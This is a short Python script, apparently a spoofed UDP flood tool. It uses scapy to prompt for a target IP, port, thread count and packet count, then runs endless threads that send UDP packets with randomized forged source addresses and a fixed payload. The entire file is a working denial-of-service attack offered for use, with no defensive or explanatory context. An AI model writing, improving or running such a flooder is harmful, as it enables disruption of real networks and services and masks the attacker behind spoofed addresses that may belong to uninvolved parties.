from scapy.all import *
import random
import threading
from colorama import Fore, Back, Style, init

init()
destinoip = input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.MAGENTA}IP: {Style.RESET_ALL}")
destino_puerto = int(input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.MAGENTA}Puerto: {Style.RESET_ALL}"))
num_threads = int(input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.MAGENTA}Threads: {Style.RESET_ALL}"))
paquetes_por_peticion = int(input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}] {Fore.MAGENTA}Paquetes: {Style.RESET_ALL}"))
def generar_direccion_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def enviar_paquetes():
    while True:
        for _ in range(paquetes_por_peticion):
            ip = IP(dst=destinoip, src=generar_direccion_ip())
            udp = UDP(sport=random.randint(1024, 65535), dport=destino_puerto)
            payload = '\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
            paquete = ip / udp / payload
            send(paquete)

hilos = []
for _ in range(num_threads):
    hilo = threading.Thread(target=enviar_paquetes)
    hilo.start()
    hilos.append(hilo)

for hilo in hilos:
    hilo.join()
